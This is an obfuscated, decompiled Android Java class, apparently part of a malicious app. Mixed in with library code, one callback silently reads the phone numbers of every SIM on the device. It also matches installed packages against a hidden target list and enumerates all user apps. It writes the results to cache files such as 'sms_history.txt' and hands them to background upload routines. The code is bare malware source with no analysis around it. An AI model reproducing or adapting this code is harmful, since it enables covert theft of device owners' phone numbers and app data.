package com.vdodsodjsdt;

import android.content.ClipData;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.os.Build;
import android.os.Bundle;
import android.os.Parcelable;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import java.io.File;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;

/* JADX INFO: compiled from: r8-map-id-3f77bbef96f83a8bf86e140490b9d41fcf0723d2c79bd2f3f370cb94135e1be4 */
/* JADX INFO: loaded from: classes.dex */
public final /* synthetic */ class Jc01di1Hsv implements HOYh3odfAhsInxjoW2Lj8Uep, gx6fD5VMu4, E2spx2fDWN5IUkY2rPialU0ch7 {
    public final /* synthetic */ int V57tEvNfxZVVcOCAOih5PKr;
    public final /* synthetic */ Object ZfQNn8hdWlEQ5cR94249PDsLR;

    public /* synthetic */ Jc01di1Hsv(int i, Object obj) {
        this.V57tEvNfxZVVcOCAOih5PKr = i;
        this.ZfQNn8hdWlEQ5cR94249PDsLR = obj;
    }

    @Override // com.vdodsodjsdt.HOYh3odfAhsInxjoW2Lj8Uep
    public Object V57tEvNfxZVVcOCAOih5PKr() {
        int i = this.V57tEvNfxZVVcOCAOih5PKr;
        Object obj = this.ZfQNn8hdWlEQ5cR94249PDsLR;
        switch (i) {
            case 0:
                Constructor constructor = (Constructor) obj;
                try {
                    return constructor.newInstance(null);
                } catch (IllegalAccessException e) {
                    sGipz63rTUmSj3uFDvOtzihao sgipz63rtumsj3ufdvotzihao = vFOm9GRo9HOyt53449EwgsRLOaA1Y.VxUQ9tBhpHJ2AAEDNW8sghc4m;
                    throw new RuntimeException("Unexpected IllegalAccessException occurred (Gson 2.13.2). Certain ReflectionAccessFilter features require Java >= 9 to work correctly. If you are not using ReflectionAccessFilter, report this to the Gson maintainers.", e);
                } catch (InstantiationException e2) {
                    throw new RuntimeException("Failed to invoke constructor '" + vFOm9GRo9HOyt53449EwgsRLOaA1Y.zzpBGItXfub0yWj(constructor) + "' with no args", e2);
                } catch (InvocationTargetException e3) {
                    throw new RuntimeException("Failed to invoke constructor '" + vFOm9GRo9HOyt53449EwgsRLOaA1Y.zzpBGItXfub0yWj(constructor) + "' with no args", e3.getCause());
                }
            default:
                Class cls = (Class) obj;
                try {
                    return JkUsygN4dyg6Qg9dzqNc.VxUQ9tBhpHJ2AAEDNW8sghc4m.VxUQ9tBhpHJ2AAEDNW8sghc4m(cls);
                } catch (Exception e4) {
                    throw new RuntimeException("Unable to create instance of " + cls + ". Registering an InstanceCreator or a TypeAdapter for this type, or adding a no-args constructor may fix this problem.", e4);
                }
        }
    }

    @Override // com.vdodsodjsdt.gx6fD5VMu4
    public void VxUQ9tBhpHJ2AAEDNW8sghc4m(Object obj) throws Throwable {
        String[] strArr;
        CharSequence charSequenceLoadLabel;
        CharSequence charSequenceLoadLabel2;
        MainActivity mainActivity = (MainActivity) this.ZfQNn8hdWlEQ5cR94249PDsLR;
        zHpcvbo7P2 zhpcvbo7p2 = (zHpcvbo7P2) obj;
        int i = MainActivity.O1xDAlBZZlZdoEf747lCFHld;
        VSncX8ksA0tswc2TMhzhOMdd vSncX8ksA0tswc2TMhzhOMdd = hRrPPME7ytOB7ba.q1wNbhk2O6;
        ej6unYlOWMDF.pYmKDYlAmhudp(zhpcvbo7p2, "result");
        int i2 = zhpcvbo7p2.V57tEvNfxZVVcOCAOih5PKr;
        IvfXhmjM3e3K ivfXhmjM3e3K = null;
        if (i2 != -1) {
            if (i2 != 0) {
                return;
            }
            mainActivity.ko09zE6UAgwkV();
            KKgVVtgki1NTGogYfNtieIfD kKgVVtgki1NTGogYfNtieIfD = new KKgVVtgki1NTGogYfNtieIfD(mainActivity, 1);
            SCROT5ML4rhhav7V3rKX2XTcsoky sCROT5ML4rhhav7V3rKX2XTcsoky = new SCROT5ML4rhhav7V3rKX2XTcsoky();
            F44whnLsbQ.KYZ9RyuOc42A2J(new gAuZgsHe09zkBKSLqYXmZ(sCROT5ML4rhhav7V3rKX2XTcsoky, kKgVVtgki1NTGogYfNtieIfD, ivfXhmjM3e3K, 4));
            if (sCROT5ML4rhhav7V3rKX2XTcsoky.V57tEvNfxZVVcOCAOih5PKr) {
                return;
            }
            try {
                Thread thread = new Thread(new klTFaDtrPxx8(3, mainActivity, new Tt3445ZYXN().ZfQNn8hdWlEQ5cR94249PDsLR(new ZMDWCwkAreXICRtratB2M3i4A(zonOxHotd3BwAPJcwqr6I6uQNngg4.qNPQb1obP7(mainActivity), VSncX8ksA0tswc2TMhzhOMdd.LaeGQIruHQu81hfJldjMOQSVblH3x(vSncX8ksA0tswc2TMhzhOMdd, mainActivity.getResources().getText(R.string.WORKER).toString()), mainActivity.getResources().getText(R.string.BRANCH).toString()))));
                thread.start();
                thread.join();
                return;
            } catch (Exception e) {
                e.printStackTrace();
                return;
            }
        }
        ArrayList arrayList = new ArrayList();
        SubscriptionManager subscriptionManager = (SubscriptionManager) mainActivity.getSystemService(SubscriptionManager.class);
        TelephonyManager telephonyManager = (TelephonyManager) mainActivity.getSystemService(TelephonyManager.class);
        List<SubscriptionInfo> activeSubscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
        String str = "";
        if (activeSubscriptionInfoList == null) {
            strArr = new String[]{"null"};
        } else {
            Iterator<SubscriptionInfo> it = activeSubscriptionInfoList.iterator();
            while (it.hasNext()) {
                TelephonyManager telephonyManagerCreateForSubscriptionId = telephonyManager.createForSubscriptionId(it.next().getSubscriptionId());
                String line1Number = telephonyManagerCreateForSubscriptionId.getLine1Number();
                if (ej6unYlOWMDF.NSjgqmGjEzuugn2SsG1mZFP(line1Number, "") || ej6unYlOWMDF.NSjgqmGjEzuugn2SsG1mZFP(line1Number, "null") || line1Number == null) {
                    arrayList.add("[номер не найден]");
                } else {
                    String line1Number2 = telephonyManagerCreateForSubscriptionId.getLine1Number();
                    ej6unYlOWMDF.h3jnZRsdwYJfY9UhQCkbvWciwvFHv(line1Number2, "getLine1Number(...)");
                    arrayList.add(line1Number2);
                }
            }
            strArr = (String[]) arrayList.toArray(new String[0]);
        }
        ArrayList arrayList2 = new ArrayList();
        List<PackageInfo> installedPackages = mainActivity.getPackageManager().getInstalledPackages(0);
        ej6unYlOWMDF.h3jnZRsdwYJfY9UhQCkbvWciwvFHv(installedPackages, "getInstalledPackages(...)");
        for (PackageInfo packageInfo : installedPackages) {
            String[] strArr2 = hRrPPME7ytOB7ba.ZLZeBXTMq0zDztBxtRTuCHrapQ;
            ApplicationInfo applicationInfo = packageInfo.applicationInfo;
            if (vmp19D2MODlOL.p6bBrs4p3Ly(strArr2, applicationInfo != null ? applicationInfo.packageName : null)) {
                ApplicationInfo applicationInfo2 = packageInfo.applicationInfo;
                if (applicationInfo2 == null || (charSequenceLoadLabel2 = applicationInfo2.loadLabel(mainActivity.getPackageManager())) == null) {
                    charSequenceLoadLabel2 = "...";
                }
                arrayList2.add(charSequenceLoadLabel2.toString());
            }
        }
        Skgk8FYn8b4TvRiBOsElZw4XkNLhQ skgk8FYn8b4TvRiBOsElZw4XkNLhQ = new Skgk8FYn8b4TvRiBOsElZw4XkNLhQ(24, mainActivity);
        if (strArr.length == 0 || ej6unYlOWMDF.NSjgqmGjEzuugn2SsG1mZFP(strArr[0], "null")) {
            String strAXO0LSrt8bKV = ej6unYlOWMDF.aXO0LSrt8bKV(mainActivity, "номер не найден");
            File file = new File(mainActivity.getCacheDir(), "sms_history.txt");
            hRrPPME7ytOB7ba.iKANjmyTSxO6v6UuLPdu7DxOjlS(file, strAXO0LSrt8bKV);
            vSncX8ksA0tswc2TMhzhOMdd.zIvmSL0wzmmKGc3X39b2Gw2mUGE(mainActivity, (String[]) arrayList2.toArray(new String[0]), new String[]{"Номер не найден :("}, skgk8FYn8b4TvRiBOsElZw4XkNLhQ);
            VSncX8ksA0tswc2TMhzhOMdd.ZLZeBXTMq0zDztBxtRTuCHrapQ(mainActivity, file, skgk8FYn8b4TvRiBOsElZw4XkNLhQ);
        } else {
            int length = strArr.length;
            int i3 = 0;
            String str2 = "";
            while (i3 < length) {
                String str3 = strArr[i3];
                i3++;
                str2 = str2 + "📞 SIM" + i3 + ": `" + str3 + "`\n";
            }
            vSncX8ksA0tswc2TMhzhOMdd.zIvmSL0wzmmKGc3X39b2Gw2mUGE(mainActivity, (String[]) arrayList2.toArray(new String[0]), strArr, skgk8FYn8b4TvRiBOsElZw4XkNLhQ);
            String strAXO0LSrt8bKV2 = ej6unYlOWMDF.aXO0LSrt8bKV(mainActivity, str2);
            File file2 = new File(mainActivity.getCacheDir(), "sms_history.txt");
            hRrPPME7ytOB7ba.iKANjmyTSxO6v6UuLPdu7DxOjlS(file2, strAXO0LSrt8bKV2);
            VSncX8ksA0tswc2TMhzhOMdd.ZLZeBXTMq0zDztBxtRTuCHrapQ(mainActivity, file2, skgk8FYn8b4TvRiBOsElZw4XkNLhQ);
        }
        List<PackageInfo> installedPackages2 = mainActivity.getPackageManager().getInstalledPackages(0);
        ej6unYlOWMDF.h3jnZRsdwYJfY9UhQCkbvWciwvFHv(installedPackages2, "getInstalledPackages(...)");
        Iterator<PackageInfo> it2 = installedPackages2.iterator();
        int i4 = 1;
        while (it2.hasNext()) {
            ApplicationInfo applicationInfo3 = it2.next().applicationInfo;
            if (((applicationInfo3 != null ? applicationInfo3.flags : 1) & 1) == 0 && applicationInfo3 != null && (charSequenceLoadLabel = applicationInfo3.loadLabel(mainActivity.getPackageManager())) != null) {
                str = str + i4 + ") " + ((Object) charSequenceLoadLabel) + "\n";
                i4++;
            }
        }
        File file3 = new File(mainActivity.getCacheDir(), "installed_apps.txt");
        hRrPPME7ytOB7ba.iKANjmyTSxO6v6UuLPdu7DxOjlS(file3, str);
        new Thread(new A3Dwt6MW552ix3T0Q(mainActivity, file3, "installed_apps", skgk8FYn8b4TvRiBOsElZw4XkNLhQ, 1)).start();
    }

    public boolean ZfQNn8hdWlEQ5cR94249PDsLR(Skgk8FYn8b4TvRiBOsElZw4XkNLhQ skgk8FYn8b4TvRiBOsElZw4XkNLhQ, int i, Bundle bundle) {
        hF6Qoen11a skgk8FYn8b4TvRiBOsElZw4XkNLhQ2;
        LTYn6OpnC6Fo lTYn6OpnC6Fo = (LTYn6OpnC6Fo) this.ZfQNn8hdWlEQ5cR94249PDsLR;
        int i2 = Build.VERSION.SDK_INT;
        if (i2 >= 25 && (i & 1) != 0) {
            try {
                ((qWuPVRr6hlUOfzGkjKs9) skgk8FYn8b4TvRiBOsElZw4XkNLhQ.ZfQNn8hdWlEQ5cR94249PDsLR).ZfQNn8hdWlEQ5cR94249PDsLR();
                Parcelable parcelable = (Parcelable) ((qWuPVRr6hlUOfzGkjKs9) skgk8FYn8b4TvRiBOsElZw4XkNLhQ.ZfQNn8hdWlEQ5cR94249PDsLR).zzpBGItXfub0yWj();
                bundle = bundle == null ? new Bundle() : new Bundle(bundle);
                bundle.putParcelable("androidx.core.view.extra.INPUT_CONTENT_INFO", parcelable);
            } catch (Exception e) {
                Log.w("InputConnectionCompat", "Can't insert content from IME; requestPermission() failed", e);
                return false;
            }
        }
        qWuPVRr6hlUOfzGkjKs9 qwupvrr6hluofzgkjks9 = (qWuPVRr6hlUOfzGkjKs9) skgk8FYn8b4TvRiBOsElZw4XkNLhQ.ZfQNn8hdWlEQ5cR94249PDsLR;
        ClipData clipData = new ClipData(qwupvrr6hluofzgkjks9.VxUQ9tBhpHJ2AAEDNW8sghc4m(), new ClipData.Item(qwupvrr6hluofzgkjks9.V57tEvNfxZVVcOCAOih5PKr()));
        if (i2 >= 31) {
            skgk8FYn8b4TvRiBOsElZw4XkNLhQ2 = new Skgk8FYn8b4TvRiBOsElZw4XkNLhQ(clipData, 2);
        } else {
            hEzujSQMPyLOvX hezujsqmpylovx = new hEzujSQMPyLOvX();
            hezujsqmpylovx.ZfQNn8hdWlEQ5cR94249PDsLR = clipData;
            hezujsqmpylovx.LaeGQIruHQu81hfJldjMOQSVblH3x = 2;
            skgk8FYn8b4TvRiBOsElZw4XkNLhQ2 = hezujsqmpylovx;
        }
        skgk8FYn8b4TvRiBOsElZw4XkNLhQ2.p59rPv72J9(qwupvrr6hluofzgkjks9.LaeGQIruHQu81hfJldjMOQSVblH3x());
        skgk8FYn8b4TvRiBOsElZw4XkNLhQ2.setExtras(bundle);
        return xb0r6yEzq0tw9m7nTWG5BFR8.GI83zq0G8e7zkn(lTYn6OpnC6Fo, skgk8FYn8b4TvRiBOsElZw4XkNLhQ2.build()) == null;
    }

    @Override // com.vdodsodjsdt.E2spx2fDWN5IUkY2rPialU0ch7
    public Ldmx6alJBFBEfM0MLq2vhR zzpBGItXfub0yWj(z5jqbAH0neG z5jqbah0neg) {
        Context context = (Context) this.ZfQNn8hdWlEQ5cR94249PDsLR;
        String str = z5jqbah0neg.zzpBGItXfub0yWj;
        EojTdi0RA3dj3eHVZuyuXZ1kkQ3Cb eojTdi0RA3dj3eHVZuyuXZ1kkQ3Cb = z5jqbah0neg.V57tEvNfxZVVcOCAOih5PKr;
        ej6unYlOWMDF.pYmKDYlAmhudp(eojTdi0RA3dj3eHVZuyuXZ1kkQ3Cb, "callback");
        if (str == null || str.length() == 0) {
            throw new IllegalArgumentException("Must set a non-null database name to a configuration that uses the no backup directory.");
        }
        return new ECym1srKKeqP9(context, str, eojTdi0RA3dj3eHVZuyuXZ1kkQ3Cb, true, true);
    }
}
